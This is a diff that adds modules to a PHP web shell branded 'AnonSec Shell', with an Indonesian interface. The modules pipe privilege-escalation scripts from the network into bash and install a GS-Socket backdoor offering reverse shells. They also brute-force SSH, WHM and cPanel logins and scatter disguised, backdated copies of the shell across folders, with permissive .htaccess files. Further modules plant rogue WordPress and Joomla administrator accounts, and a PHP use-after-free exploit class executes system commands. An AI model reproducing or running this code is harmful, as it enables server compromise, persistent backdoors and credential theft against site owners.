+// 8. ROOT ME
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "rootme") {
+    echo "<center><h3>🔥 ROOT ME — Privilege Escalation</h3><hr><pre>";
+    echo "[+] System Info:\n" . komend("uname -a", $lokasi);
+    echo "\n[+] User Info:\n" . komend("id", $lokasi);
+    echo "\n[+] Running LinPEAS (limited):\n" . komend("curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | head -80", $lokasi);
+    echo "\n[+] Exploit Suggester:\n" . komend("curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash 2>/dev/null | head -50", $lokasi);
+    echo "</pre>"; die(author());
+}
+
+// ============================================================
+// 9. GS-SOCKET
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "gssocket") {
+    echo "<center><h3>🔥 GS-SOCKET INSTALLER</h3><hr>";
+    if (!$isw($lokasi)) die(red("Directory not writable!"));
+    $url = "https://raw.githubusercontent.com/anonsec/gs-socket/main/gs-socket.php";
+    $content = @file_get_contents($url);
+    if (strlen($content) > 1000) {
+        file_put_contents($lokasi."/gs-socket.php", $content); chmod($lokasi."/gs-socket.php", 0644);
+        echo "✅ GS-Socket installed: <a href='gs-socket.php' target='_blank'>gs-socket.php</a><br>";
+        echo "📌 Usage: ?cmd=whoami | ?bind=4444 | ?reverse=127.0.0.1:4444";
+    } else { echo "❌ Failed to download. Manual upload required."; }
+    die(author());
+}
+
+// ============================================================
+// 10. CRACK
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "crack") {
+    echo "<center><h3>🔥 CRACK TOOLS — WHM/cPanel + SSH</h3><hr>";
+    echo '<form method="post">';
+    echo 'Target IP/Domain: <input type="text" name="target" class="up" placeholder="192.168.1.1 or domain.com"><br><br>';
+    echo 'Port (default 22): <input type="text" name="port" class="up" value="22"><br><br>';
+    echo 'Username list: <textarea name="userlist" class="up" rows="2" cols="40" placeholder="root&#10;admin&#10;user">root&#10;admin</textarea><br><br>';
+    echo 'Password list: <textarea name="passlist" class="up" rows="3" cols="40" placeholder="password&#10;123456&#10;admin">password&#10;123456</textarea><br><br>';
+    echo 'Action: <select name="crack_action" class="up"><option value="ssh">SSH Brute</option><option value="whm">WHM Brute (port 2087)</option><option value="cpanel">cPanel Brute (port 2083)</option><option value="ssh_add">SSH Auto Add User (if root)</option></select><br><br>';
+    echo '<input type="submit" name="run_crack" value="🚀 Execute" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    if (isset($_POST['run_crack'])) {
+        $target = $_POST['target']; $port = $_POST['port']; $userlist = explode("\n", trim($_POST['userlist'])); $passlist = explode("\n", trim($_POST['passlist'])); $action = $_POST['crack_action'];
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:10px;border-radius:4px;'>";
+        echo "[+] Target: $target:$port\n[+] Action: $action\n[+] Users: " . count($userlist) . " | Passwords: " . count($passlist) . "\n----------------------------------------\n";
+        if ($action == 'ssh') {
+            foreach ($userlist as $user) { $user = trim($user); if (empty($user)) continue;
+                foreach ($passlist as $pass) { $pass = trim($pass); if (empty($pass)) continue;
+                    $cmd = "sshpass -p '$pass' ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no $user@$target -p $port 'echo ok' 2>&1";
+                    $result = @shell_exec($cmd);
+                    if (strpos($result, 'ok') !== false) { echo "[✔] FOUND: $user:$pass\n"; break; } else { echo "[✘] $user:$pass\n"; }
+                }
+            }
+        } elseif ($action == 'whm') {
+            $whm_port = $port ?: 2087;
+            foreach ($userlist as $user) { $user = trim($user); if (empty($user)) continue;
+                foreach ($passlist as $pass) { $pass = trim($pass); if (empty($pass)) continue;
+                    $url = "https://$target:$whm_port/json-api/login?user=$user&pass=$pass";
+                    $cmd = "curl -s -k -m 3 '$url' 2>/dev/null";
+                    $result = @shell_exec($cmd);
+                    if (strpos($result, '"status":1') !== false || strpos($result, '"status":"1"') !== false) { echo "[✔] WHM FOUND: $user:$pass\n"; break; }
+                }
+            }
+        } elseif ($action == 'cpanel') {
+            $cp_port = $port ?: 2083;
+            foreach ($userlist as $user) { $user = trim($user); if (empty($user)) continue;
+                foreach ($passlist as $pass) { $pass = trim($pass); if (empty($pass)) continue;
+                    $url = "https://$target:$cp_port/login/?user=$user&pass=$pass";
+                    $cmd = "curl -s -k -m 3 -L '$url' 2>/dev/null | grep -q 'cpanel' && echo 'ok'";
+                    $result = @shell_exec($cmd);
+                    if (strpos($result, 'ok') !== false) { echo "[✔] cPanel FOUND: $user:$pass\n"; break; }
+                }
+            }
+        } elseif ($action == 'ssh_add') {
+            echo "[+] SSH Auto Add User (requires root access)\n";
+            echo '<form method="post">Root User: <input type="text" name="root_user" class="up" value="root"><br>Root Pass: <input type="password" name="root_pass" class="up"><br>New User: <input type="text" name="new_user" class="up" value="vpsuser"><br>New Pass: <input type="text" name="new_pass" class="up" value="P@ssw0rd123"><br><input type="submit" name="do_ssh_add" value="Add User" class="up" style="cursor:pointer;"></form>';
+        }
+        echo "</pre>";
+    }
+    if (isset($_POST['do_ssh_add'])) {
+        $root_user = $_POST['root_user']; $root_pass = $_POST['root_pass']; $new_user = $_POST['new_user']; $new_pass = $_POST['new_pass']; $target = $_POST['target']; $port = $_POST['port'] ?: 22;
+        echo "<pre>";
+        echo "[+] Adding user $new_user on $target\n";
+        $cmds = [
+            "sshpass -p '$root_pass' ssh -o StrictHostKeyChecking=no $root_user@$target -p $port 'useradd -m -s /bin/bash $new_user' 2>&1",
+            "sshpass -p '$root_pass' ssh -o StrictHostKeyChecking=no $root_user@$target -p $port \"echo '$new_user:$new_pass' | chpasswd\" 2>&1",
+            "sshpass -p '$root_pass' ssh -o StrictHostKeyChecking=no $root_user@$target -p $port 'usermod -aG wheel $new_user' 2>&1",
+            "sshpass -p '$root_pass' ssh -o StrictHostKeyChecking=no $root_user@$target -p $port 'mkdir -p /home/$new_user/.ssh && chmod 700 /home/$new_user/.ssh' 2>&1"
+        ];
+        foreach ($cmds as $cmd) { echo "> $cmd\n"; $result = @shell_exec($cmd); echo $result . "\n"; }
+        echo "[✔] User $new_user added! SSH: $target:$port | user: $new_user | pass: $new_pass\n";
+        echo "</pre>"; die(author());
+    }
+    die(author());
+}
+
+
+
+// ============================================================
+// SPREAD — Tebar Shell ke banyak folder acak
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "spread") {
+    echo "<center><h3>🔥 SPREAD — Tebar Shell</h3><hr>";
+    echo "<font color='#aaa'>Tebar shell ke banyak folder acak dengan nama samaran</font><br><br>";
+    
+    $current_file = basename($_SERVER['SCRIPT_FILENAME']);
+    echo "File sumber: <gold>" . $current_file . "</gold><br><br>";
+    
+    echo '<form method="post">';
+    echo 'Target path: <input type="text" name="spread_path" class="up" value="/home/" style="width:300px;"><br><br>';
+    echo 'Maksimal folder: <input type="number" name="spread_max" class="up" value="20" min="1" max="100"><br><br>';
+    echo 'Buat .htaccess allow: <input type="checkbox" name="spread_htaccess" checked><br><br>';
+    echo '<input type="submit" name="run_spread" value="🚀 Spread Shell" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['run_spread'])) {
+        $target_path = rtrim($_POST['spread_path'], '/');
+        $max_folder = intval($_POST['spread_max']);
+        $create_htaccess = isset($_POST['spread_htaccess']);
+        $source_file = __FILE__;
+        $source_content = file_get_contents($source_file);
+        
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:500px;overflow:auto;'>";
+        echo "🚀 SPREAD — Menebar Shell\n";
+        echo "═══════════════════════════════════════════════════════════\n";
+        echo "📂 Sumber: " . basename($source_file) . "\n";
+        echo "📂 Target: " . $target_path . "\n";
+        echo "📊 Maks: $max_folder folder\n\n";
+        
+        // Cari folder dengan file PHP
+        $cmd = 'find ' . $target_path . ' -maxdepth 4 -type f -name "*.php" 2>/dev/null | head -200';
+        $php_files = komenb($cmd, $lokasi);
+        $folders = [];
+        
+        if ($php_files) {
+            foreach (explode("\n", $php_files) as $pf) {
+                $pf = trim($pf);
+                if ($pf) {
+                    $folder = dirname($pf);
+                    if (!isset($folders[$folder])) {
+                        $folders[$folder] = pathinfo($pf, PATHINFO_FILENAME);
+                    }
+                }
+            }
+        }
+        
+        // Acak folder
+        $folder_keys = array_keys($folders);
+        shuffle($folder_keys);
+        $folder_keys = array_slice($folder_keys, 0, $max_folder);
+        
+        echo "📁 Ditemukan " . count($folders) . " folder dengan PHP\n";
+        echo "📁 Dipilih " . count($folder_keys) . " folder untuk disebar\n\n";
+        
+        $copied = 0;
+        foreach ($folder_keys as $folder) {
+            $original_name = $folders[$folder];
+            // Generate nama samaran
+            $fake_name = $original_name;
+            if (preg_match_all('/\d+/', $fake_name, $matches)) {
+                foreach ($matches[0] as $angka) {
+                    $angka_baru = '';
+                    for ($i = 0; $i < strlen($angka); $i++) {
+                        $angka_baru .= rand(0, 9);
+                    }
+                    $fake_name = preg_replace('/' . $angka . '/', $angka_baru, $fake_name, 1);
+                }
+            } else {
+                $suffixes = ['_conf', '_api', '_core', '_init', '_inc', '_backup'];
+                $fake_name .= $suffixes[array_rand($suffixes)];
+            }
+            $fake_name .= '.php';
+            
+            $target_file = $folder . '/' . $fake_name;
+            
+            if (file_exists($target_file)) {
+                echo "  ⏭️  Skip (exists): $target_file\n";
+                continue;
+            }
+            
+            if (file_put_contents($target_file, $source_content)) {
+                touch($target_file, filemtime($folder . '/' . $original_name . '.php'));
+                echo "  ✅ Copied: $target_file\n";
+                
+                // Buat .htaccess allow
+                if ($create_htaccess) {
+                    $htaccess_content = "# Allow access to this shell\n";
+                    $htaccess_content .= "<Files \"$fake_name\">\n";
+                    $htaccess_content .= "    Order Allow,Deny\n";
+                    $htaccess_content .= "    Allow from all\n";
+                    $htaccess_content .= "</Files>\n\n";
+                    $htaccess_content .= "# Allow all files in this directory\n";
+                    $htaccess_content .= "<FilesMatch \".*\">\n";
+                    $htaccess_content .= "    Order Allow,Deny\n";
+                    $htaccess_content .= "    Allow from all\n";
+                    $htaccess_content .= "</FilesMatch>\n";
+                    file_put_contents($folder . '/.htaccess', $htaccess_content);
+                    echo "  📄 .htaccess created in: $folder\n";
+                }
+                $copied++;
+            } else {
+                echo "  ❌ Failed: $target_file\n";
+            }
+        }
+        
+        echo "\n───────────────────────────────────────────────────────────\n";
+        echo "✅ Selesai! $copied shell tersebar.\n";
+        echo "</pre>";
+        die(author());
+    }
+    die(author());
+}
+
+// ============================================================
+// HTALLOW — Create .htaccess Allow All di folder tertentu
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "htallow") {
+    echo "<center><h3>🔥 HTACCESS ALLOW</h3><hr>";
+    echo "<font color='#aaa'>Buat .htaccess yang mengizinkan akses semua file</font><br><br>";
+    
+    $current_file = basename($_SERVER['SCRIPT_FILENAME']);
+    echo "File saat ini: <gold>" . $current_file . "</gold><br><br>";
+    
+    echo '<form method="post">';
+    echo 'Path: <input type="text" name="htallow_path" class="up" value="' . $lokasi . '" style="width:300px;"><br><br>';
+    echo 'Mode: ';
+    echo '<select name="htallow_mode" class="up">';
+    echo '<option value="allow_all">✅ Allow All Files</option>';
+    echo '<option value="allow_current">🔒 Allow Only ' . $current_file . '</option>';
+    echo '<option value="allow_specific">📄 Allow Specific File</option>';
+    echo '</select><br><br>';
+    echo 'Specific file (jika mode specific): <input type="text" name="htallow_file" class="up" placeholder="shell.php"><br><br>';
+    echo 'Backup existing: <input type="checkbox" name="htallow_backup" checked><br><br>';
+    echo '<input type="submit" name="run_htallow" value="⚡ Create .htaccess" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['run_htallow'])) {
+        $path = rtrim($_POST['htallow_path'], '/');
+        $mode = $_POST['htallow_mode'];
+        $backup = isset($_POST['htallow_backup']);
+        $specific_file = $_POST['htallow_file'] ?? $current_file;
+        $htaccess_file = $path . '/.htaccess';
+        
+        if ($backup && file_exists($htaccess_file)) {
+            $backup_name = '.htaccess.backup_' . date('Ymd_His');
+            copy($htaccess_file, $path . '/' . $backup_name);
+            echo "✅ Backup created: $backup_name<br>";
+        }
+        
+        $content = "# ============================================\n";
+        $content .= "# HTACCESS — Created by AnonSec Shell\n";
+        $content .= "# ============================================\n\n";
+        
+        if ($mode == 'allow_all') {
+            $content .= "<FilesMatch \".*\">\n";
+            $content .= "    Order Allow,Deny\n";
+            $content .= "    Allow from all\n";
+            $content .= "</FilesMatch>\n\n";
+            $content .= "Options +Indexes\n";
+            $content .= "IndexOptions FancyIndexing\n\n";
+            $content .= "<IfModule mod_php7.c>\n";
+            $content .= "    php_value display_errors On\n";
+            $content .= "    php_value max_execution_time 300\n";
+            $content .= "    php_value memory_limit 256M\n";
+            $content .= "</IfModule>\n";
+        } elseif ($mode == 'allow_current') {
+            $content .= "Order Deny,Allow\n";
+            $content .= "Deny from all\n\n";
+            $content .= "<Files \"$current_file\">\n";
+            $content .= "    Order Allow,Deny\n";
+            $content .= "    Allow from all\n";
+            $content .= "</Files>\n\n";
+            $content .= "<FilesMatch \"^(index\\.php|index\\.html)\$">\n";
+            $content .= "    Order Allow,Deny\n";
+            $content .= "    Allow from all\n";
+            $content .= "</FilesMatch>\n\n";
+            $content .= "Options -Indexes\n";
+        } else {
+            $content .= "Order Deny,Allow\n";
+            $content .= "Deny from all\n\n";
+            $content .= "<Files \"$specific_file\">\n";
+            $content .= "    Order Allow,Deny\n";
+            $content .= "    Allow from all\n";
+            $content .= "</Files>\n\n";
+            $content .= "<FilesMatch \"^(index\\.php|index\\.html)\$">\n";
+            $content .= "    Order Allow,Deny\n";
+            $content .= "    Allow from all\n";
+            $content .= "</FilesMatch>\n\n";
+            $content .= "Options -Indexes\n";
+        }
+        
+        if (file_put_contents($htaccess_file, $content)) {
+            chmod($htaccess_file, 0644);
+            echo "✅ .htaccess created: $htaccess_file<br><br>";
+            echo "<pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:300px;overflow:auto;'>";
+            echo htmlspecialchars($content);
+            echo "</pre>";
+        } else {
+            echo "❌ Failed to create .htaccess! Check permissions.<br>";
+        }
+        die(author());
+    }
+    die(author());
+}
+
+// ============================================================
+// 11. WP ADD USER
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "wpadd") {
+    echo "<center><h3>🔥 WORDPRESS ADD USER</h3><hr><font color='#aaa'>Tambahkan user admin ke WordPress yang sudah terinstall</font><br><br>";
+    echo '<form method="post">Path WordPress: <input type="text" name="wp_path" class="up" value="' . $lokasi . '" placeholder="/home/user/public_html"><br><br>';
+    echo 'Username: <input type="text" name="wp_user" class="up" value="admin_' . rand(100,999) . '"><br><br>';
+    echo 'Password: <input type="text" name="wp_pass" class="up" value="P@ssw0rd' . rand(100,999) . '"><br><br>';
+    echo 'Email: <input type="text" name="wp_email" class="up" value="admin@' . $_SERVER['SERVER_NAME'] . '"><br><br>';
+    echo 'Role: <select name="wp_role" class="up"><option value="administrator">Administrator</option><option value="editor">Editor</option><option value="author">Author</option></select><br><br>';
+    echo '<input type="submit" name="run_wpadd" value="➕ Add User" class="up" style="cursor:pointer;"></form>';
+    if (isset($_POST['run_wpadd'])) {
+        $path = rtrim($_POST['wp_path'], '/'); $user = $_POST['wp_user']; $pass = $_POST['wp_pass']; $email = $_POST['wp_email']; $role = $_POST['wp_role'];
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:10px;border-radius:4px;'>";
+        echo "[+] Target Path: $path\n[+] Username: $user | Role: $role\n";
+        $wpconfig = $path . '/wp-config.php';
+        if (!file_exists($wpconfig)) { $wpconfig = dirname($path) . '/wp-config.php'; }
+        if (!file_exists($wpconfig)) { echo "[✘] wp-config.php not found! Bukan folder WordPress.\n</pre>"; die(author()); }
+        define('WP_USE_THEMES', false); require_once($wpconfig);
+        $conn = @new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
+        if ($conn->connect_error) {
+            echo "[✘] Database connection failed: " . $conn->connect_error . "\n";
+            echo "[!] Coba inject manual via SQL:\n";
+            echo "INSERT INTO `{$conn->real_escape_string(DB_NAME)}`.`{$conn->real_escape_string($table_prefix)}users` (user_login, user_pass, user_email, user_registered) VALUES ('$user', MD5('$pass'), '$email', NOW());\n";
+            echo "INSERT INTO `{$conn->real_escape_string(DB_NAME)}`.`{$conn->real_escape_string($table_prefix)}usermeta` (user_id, meta_key, meta_value) VALUES (LAST_INSERT_ID(), '{$conn->real_escape_string($table_prefix)}capabilities', 'a:1:{s:13:\"administrator\";b:1;}');\n</pre>";
+            die(author());
+        }
+        $check = $conn->query("SELECT ID FROM {$conn->real_escape_string(DB_NAME)}.{$conn->real_escape_string($table_prefix)}users WHERE user_login = '$user'");
+        if ($check->num_rows > 0) { echo "[✘] User '$user' sudah ada!\n</pre>"; die(author()); }
+        $hashed = md5($pass);
+        $sql = "INSERT INTO {$conn->real_escape_string(DB_NAME)}.{$conn->real_escape_string($table_prefix)}users (user_login, user_pass, user_email, user_registered) VALUES ('$user', '$hashed', '$email', NOW())";
+        if ($conn->query($sql) === TRUE) {
+            $user_id = $conn->insert_id;
+            $meta_sql = "INSERT INTO {$conn->real_escape_string(DB_NAME)}.{$conn->real_escape_string($table_prefix)}usermeta (user_id, meta_key, meta_value) VALUES ($user_id, '{$conn->real_escape_string($table_prefix)}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
+            $conn->query($meta_sql);
+            echo "[✔] USER ADDED SUCCESSFULLY!\n----------------------------------------\nURL: " . $_SERVER['HTTP_HOST'] . "\nPath: $path\nUsername: $user\nPassword: $pass\nEmail: $email\nRole: $role\n----------------------------------------\n🔑 Login: " . $_SERVER['HTTP_HOST'] . "/wp-admin\n";
+        } else { echo "[✘] Failed: " . $conn->error . "\n"; }
+        $conn->close(); echo "</pre>"; die(author());
+    }
+    die(author());
+}
+
+// ============================================================
+// 12. JML ADD USER
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "jmladd") {
+    echo "<center><h3>🔥 JOOMLA ADD USER</h3><hr><font color='#aaa'>Tambahkan user admin ke Joomla yang sudah terinstall</font><br><br>";
+    echo '<form method="post">Path Joomla: <input type="text" name="jml_path" class="up" value="' . $lokasi . '" placeholder="/home/user/public_html"><br><br>';
+    echo 'Username: <input type="text" name="jml_user" class="up" value="admin_' . rand(100,999) . '"><br><br>';
+    echo 'Password: <input type="text" name="jml_pass" class="up" value="P@ssw0rd' . rand(100,999) . '"><br><br>';
+    echo 'Email: <input type="text" name="jml_email" class="up" value="admin@' . $_SERVER['SERVER_NAME'] . '"><br><br>';
+    echo 'Nama: <input type="text" name="jml_name" class="up" value="Admin"><br><br>';
+    echo '<input type="submit" name="run_jmladd" value="➕ Add User" class="up" style="cursor:pointer;"></form>';
+    if (isset($_POST['run_jmladd'])) {
+        $path = rtrim($_POST['jml_path'], '/'); $user = $_POST['jml_user']; $pass = $_POST['jml_pass']; $email = $_POST['jml_email']; $name = $_POST['jml_name'];
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:10px;border-radius:4px;'>";
+        echo "[+] Target Path: $path\n[+] Username: $user | Name: $name\n";
+        $configfile = $path . '/configuration.php';
+        if (!file_exists($configfile)) { $configfile = dirname($path) . '/configuration.php'; }
+        if (!file_exists($configfile)) { echo "[✘] configuration.php not found! Bukan folder Joomla.\n</pre>"; die(author()); }
+        $config_content = file_get_contents($configfile);
+        preg_match('/public \$host = \'([^\']+)\';/', $config_content, $host);
+        preg_match('/public \$user = \'([^\']+)\';/', $config_content, $dbuser);
+        preg_match('/public \$password = \'([^\']+)\';/', $config_content, $dbpass);
+        preg_match('/public \$db = \'([^\']+)\';/', $config_content, $db);
+        preg_match('/public \$dbprefix = \'([^\']+)\';/', $config_content, $prefix);
+        if (empty($host) || empty($dbuser) || empty($dbpass) || empty($db) || empty($prefix)) { echo "[✘] Gagal parsing configuration.php\n</pre>"; die(author()); }
+        $conn = @new mysqli($host[1], $dbuser[1], $dbpass[1], $db[1]);
+        if ($conn->connect_error) {
+            echo "[✘] Database connection failed: " . $conn->connect_error . "\n";
+            echo "[!] Coba inject manual via SQL:\n";
+            echo "INSERT INTO `{$conn->real_escape_string($db[1])}`.`{$conn->real_escape_string($prefix[1])}users` (name, username, email, password, block, sendEmail, registerDate, lastvisitDate) VALUES ('$name', '$user', '$email', MD5('$pass'), 0, 0, NOW(), NOW());\n";
+            echo "INSERT INTO `{$conn->real_escape_string($db[1])}`.`{$conn->real_escape_string($prefix[1])}user_usergroup_map` (user_id, group_id) VALUES (LAST_INSERT_ID(), 8);\n</pre>";
+            die(author());
+        }
+        $check = $conn->query("SELECT id FROM {$conn->real_escape_string($db[1])}.{$conn->real_escape_string($prefix[1])}users WHERE username = '$user'");
+        if ($check->num_rows > 0) { echo "[✘] User '$user' already exists!\n</pre>"; die(author()); }
+        $hashed = md5($pass);
+        $sql = "INSERT INTO {$conn->real_escape_string($db[1])}.{$conn->real_escape_string($prefix[1])}users (name, username, email, password, block, sendEmail, registerDate, lastvisitDate, activation) VALUES ('$name', '$user', '$email', '$hashed', 0, 0, NOW(), NOW(), '')";
+        if ($conn->query($sql) === TRUE) {
+            $user_id = $conn->insert_id;
+            $map_sql = "INSERT INTO {$conn->real_escape_string($db[1])}.{$conn->real_escape_string($prefix[1])}user_usergroup_map (user_id, group_id) VALUES ($user_id, 8)";
+            $conn->query($map_sql);
+            echo "[✔] USER ADDED SUCCESSFULLY!\n----------------------------------------\nURL: " . $_SERVER['HTTP_HOST'] . "\nPath: $path\nUsername: $user\nPassword: $pass\nEmail: $email\nName: $name\nGroup: Super User (ID 8)\n----------------------------------------\n🔑 Login: " . $_SERVER['HTTP_HOST'] . "/administrator\n";
+        } else { echo "[✘] Failed: " . $conn->error . "\n"; }
+        $conn->close(); echo "</pre>"; die(author());
+    }
+    die(author());
+}
+
+// ============================================================
+// 13. HTACCESS
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "htaccess") {
+    echo "<center><h3>🔥 AUTO HTACCESS</h3><hr>";
+    
+    $current_file = basename($_SERVER['SCRIPT_FILENAME']);
+    $htaccess_path = $lokasi . '/.htaccess';
+    
+    echo "Current directory: <gold>" . $hsc($lokasi) . "</gold><br>";
+    echo "Current file: <gold>" . $hsc($current_file) . "</gold><br><br>";
+    
+    echo '<form method="post">';
+    echo 'Select mode: ';
+    echo '<select name="htaccess_mode" class="up">';
+    echo '<option value="allow_all">✅ Allow All Files</option>';
+    echo '<option value="deny_all">🚫 Deny All Except ' . $hsc($current_file) . '</option>';
+    echo '</select><br><br>';
+    echo 'Create backup: <input type="checkbox" name="htaccess_backup" checked><br><br>';
+    echo '<input type="submit" name="run_htaccess" value="⚡ Apply .htaccess" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['run_htaccess'])) {
+        $mode = $_POST['htaccess_mode'];
+        $backup = isset($_POST['htaccess_backup']);
+        $content = '';
+        
+        if ($backup && file_exists($htaccess_path)) {
+            $backup_name = '.htaccess.backup_' . date('Ymd_His');
+            @copy($htaccess_path, $lokasi . '/' . $backup_name);
+            echo "[✔] Backup created: $backup_name<br>";
+        }
+        
+        if ($mode == 'allow_all') {
+            $content = "# ============================================\n";
+            $content .= "# HTACCESS — Allow All Files\n";
+            $content .= "# Generated by AnonSec Shell\n";
+            $content .= "# ============================================\n\n";
+            $content .= "<FilesMatch \".*\">\n";
+            $content .= "    Order Allow,Deny\n";
+            $content .= "    Allow from all\n";
+            $content .= "</FilesMatch>\n\n";
+            $content .= "# Allow directory listing (optional)\n";
+            $content .= "Options +Indexes\n";
+            $content .= "IndexOptions FancyIndexing\n\n";
+            $content .= "# PHP settings\n";
+            $content .= "<IfModule mod_php7.c>\n";
+            $content .= "    php_value display_errors On\n";
+            $content .= "    php_value max_execution_time 300\n";
+            $content .= "    php_value memory_limit 256M\n";
+            $content .= "</IfModule>\n";
+            echo "[✔] Mode: Allow All Files<br>";
+        } else {
+            $content = "# ============================================\n";
+            $content .= "# HTACCESS — Deny All Except: $current_file\n";
+            $content .= "# Generated by AnonSec Shell\n";
+            $content .= "# ============================================\n\n";
+            $content .= "# Deny all requests\n";
+            $content .= "Order Deny,Allow\n";
+            $content .= "Deny from all\n\n";
+            $content .= "# Allow only this file\n";
+            $content .= "<Files \"$current_file\">\n";
+            $content .= "    Order Allow,Deny\n";
+            $content .= "    Allow from all\n";
+            $content .= "</Files>\n\n";
+            $content .= "# Allow index.php and index.html (optional)\n";
+            $content .= "<FilesMatch \"^(index\\.php|index\\.html)$\">\n";
+            $content .= "    Order Allow,Deny\n";
+            $content .= "    Allow from all\n";
+            $content .= "</FilesMatch>\n\n";
+            $content .= "# Block access to sensitive files\n";
+            $content .= "<FilesMatch \"^\\.(htaccess|htpasswd|env|git|log)\">\n";
+            $content .= "    Order Allow,Deny\n";
+            $content .= "    Deny from all\n";
+            $content .= "</FilesMatch>\n\n";
+            $content .= "# Block directory listing\n";
+            $content .= "Options -Indexes\n";
+            echo "[✔] Mode: Deny All Except <gold>$current_file</gold><br>";
+        }
+        
+        if (@file_put_contents($htaccess_path, $content) !== false) {
+            @chmod($htaccess_path, 0644);
+            echo "[✔] .htaccess applied successfully!<br>";
+            echo "📌 Path: <a href='?loknya=" . urlencode($lokasi) . "'><gold>" . $hsc($htaccess_path) . "</gold></a><br><br>";
+            echo "<pre style='text-align:left;background:#0a0a0a;padding:10px;border-radius:4px;max-height:300px;overflow:auto;'>";
+            echo $hsc($content);
+            echo "</pre>";
+        } else {
+            echo "[✘] Failed to write .htaccess! Check permissions.<br>";
+        }
+        echo "<hr>"; die(author());
+    }
+    die(author());
+}
+
+// ============================================================
+// 14. PHP EXPLOIT — Class Pwn Command Execution
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "phpexp") {
+    echo "<center><h3>🔥 PHP COMMAND EXECUTION (Class Pwn)</h3><hr>";
+    echo '<font color="#aaa">Eksekusi perintah sistem menggunakan exploit class Pwn</font><br><br>';
+    
+    echo '<form method="post">';
+    echo 'Perintah: <input type="text" name="pwn_cmd" class="up" style="width:60%;" value="' . (isset($_POST['pwn_cmd']) ? htmlspecialchars($_POST['pwn_cmd']) : 'whoami') . '">';
+    echo '<input type="submit" name="run_pwn" value="🚀 Execute" class="up" style="cursor:pointer;">';
+    echo '</form><br>';
+    
+    if (isset($_POST['run_pwn']) && isset($_POST['pwn_cmd'])) {
+        $cmd = $_POST['pwn_cmd'];
+        echo '<hr><div style="text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;border:1px solid #2a2a2a;">';
+        echo '<b style="color:#00d4ff;">📌 Perintah:</b> <span style="color:#00ff9d;">' . htmlspecialchars($cmd) . '</span><br><br>';
+        echo '<b style="color:#00d4ff;">📤 Hasil:</b><br>';
+        echo '<pre style="color:#00ff9d;background:#0a0a0a;padding:10px;border-radius:4px;max-height:400px;overflow:auto;">';
+        
+        // ============================================================
+        // CLASS PWN — COMMAND EXECUTION
+        // ============================================================
+        class Helper { public $a, $b, $c; }
+        class Pwn {
+            const LOGGING = false;
+            const CHUNK_DATA_SIZE = 0x60;
+            const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
+            const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;
+            const HT_SIZE = 0x118;
+            const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;
+     
+            public function __construct($cmd) {
+                for($i = 0; $i < 10; $i++) {
+                    $groom[] = self::alloc(self::STRING_SIZE);
+                    $groom[] = self::alloc(self::HT_STRING_SIZE);
+                }
+     
+                $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
+                $fill = self::alloc(self::STRING_SIZE);
+     
+                $this->abc = self::alloc(self::STRING_SIZE);
+                $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
+                self::log("abc @ 0x%x", $abc_addr);
+     
+                $this->free($abc_addr);
+                $this->helper = new Helper;
+                if(strlen($this->abc) < 0x1337) {
+                    self::log("uaf failed");
+                    return;
+                }
+     
+                $this->helper->a = "leet";
+                $this->helper->b = function($x) {};
+                $this->helper->c = 0xfeedface;
+     
+                $helper_handlers = $this->rel_read(0);
+                self::log("helper handlers @ 0x%x", $helper_handlers);
+     
+                $closure_addr = $this->rel_read(0x20);
+                self::log("real closure @ 0x%x", $closure_addr);
+     
+                $closure_ce = $this->read($closure_addr + 0x10);
+                self::log("closure class_entry @ 0x%x", $closure_ce);
+     
+                $basic_funcs = $this->get_basic_funcs($closure_ce);
+                self::log("basic_functions @ 0x%x", $basic_funcs);
+     
+                $zif_system = $this->get_system($basic_funcs);
+                self::log("zif_system @ 0x%x", $zif_system);
+     
+                $fake_closure_off = 0x70;
+                for($i = 0; $i < 0x138; $i += 8) {
+                    $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
+                }
+                $this->rel_write($fake_closure_off + 0x38, 1, 4);
+                $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
+                $this->rel_write($fake_closure_off + $handler_offset, $zif_system);
+     
+                $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
+                self::log("fake closure @ 0x%x", $fake_closure_addr);
+     
+                $this->rel_write(0x20, $fake_closure_addr);
+                ($this->helper->b)($cmd);
+     
+                $this->rel_write(0x20, $closure_addr);
+                unset($this->helper->b);
+            }
+     
+            private function heap_leak() {
+                $arr = [[], []];
+                set_error_handler(function() use (&$arr, &$buf) {
+                    $arr = 1;
+                    $buf = str_repeat("\x00", self::HT_STRING_SIZE);
+                });
